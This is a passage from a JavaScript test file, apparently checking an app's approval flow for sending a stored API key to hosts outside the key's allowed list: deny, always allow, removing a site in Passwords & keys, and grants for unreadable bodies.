  // deny
  seen3.length = 0; p = ask("api.appstoreconnect.apple.com", kuse); await decide("deny"); assert.equal((await p).verdict, "deny"); assert.deepEqual(sites(), ["api.weather.example"]);
  // always allow: the site joins the key's list, once
  seen3.length = 0; p = ask("api.appstoreconnect.apple.com", kuse); await decide("channel"); assert.equal((await p).verdict, "allow");
  assert.deepEqual(sites(), ["api.weather.example", "api.appstoreconnect.apple.com"]);
  assert.equal(dodb3.prepare("SELECT COUNT(*) n FROM grants WHERE host='api.appstoreconnect.apple.com'").get().n, 0, "no separate grant: the key's own list is the record");
  // the next request to that site is no longer held (the Sentinel's lock reads the list)
  assert.equal(keyUseCheck({ host: "api.appstoreconnect.apple.com", url: "https://api.appstoreconnect.apple.com/", headers: new Headers({ a: REAL }), scrubber: makeScrubber([{ name: "WEATHER_KEY", value: REAL, hosts: JSON.stringify(sites()) }]) }).hold, false);
  // removing the site in Passwords & keys brings the lock back
  await saveVaultKey(envV, "t1", { name: "WEATHER_KEY", was: "WEATHER_KEY", hosts: ["api.weather.example"], value: "" }); assert.deepEqual(sites(), ["api.weather.example"]);
  // an unreadable body held for a site no key names: Always allow is the ordinary grant for the site, and no key's list changes
  seen3.length = 0; p = ask("up.example", { names: ["WEATHER_KEY"], labels: ["Weather"], unreadable: true }); await decide("channel"); assert.equal((await p).verdict, "allow");
  assert.deepEqual(sites(), ["api.weather.example"]); assert.equal(dodb3.prepare("SELECT COUNT(*) n FROM grants WHERE host='up.example'").get().n, 1);
  ok("the approval card names the key by its label; Allow once changes nothing, Don't allow blocks, Always allow adds the site to the key's list (and Passwords & keys can remove it again)");
}
console.log = log0; console.log("keysreal: all passed");
